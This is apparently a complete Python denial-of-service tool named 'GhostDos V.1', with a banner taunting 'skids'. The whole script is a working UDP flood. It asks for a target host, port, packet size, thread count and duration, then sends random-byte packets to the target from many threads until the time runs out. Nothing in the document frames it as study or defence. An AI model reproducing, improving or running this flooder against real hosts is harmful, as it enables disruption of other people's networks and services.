import time
import random
import socket
import threading

print("GhostDos V.1")
print("Made By PhantomGhost & PhantomFangs")
print("Time To Ghost These Skids")

target = input("Target: ")
port = int(input("Port: "))
psize = int(input("Packet Size (Max: 65500): "))
threads = int(input("Threads: "))
timer = float(input("Time(s): "))

timeout = time.time() + 1 * timer

package = random._urandom(psize)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def udp():
        while time.time() < timeout:
                sock.sendto(package, (target, port))

for i in range(threads):
        thread = threading.Thread(target=udp)
        thread.setDaemon(True)
        thread.start()

print("Attack started on: %s" % (target))

time.sleep(timer)
input("Attack ended on %s" % (target))
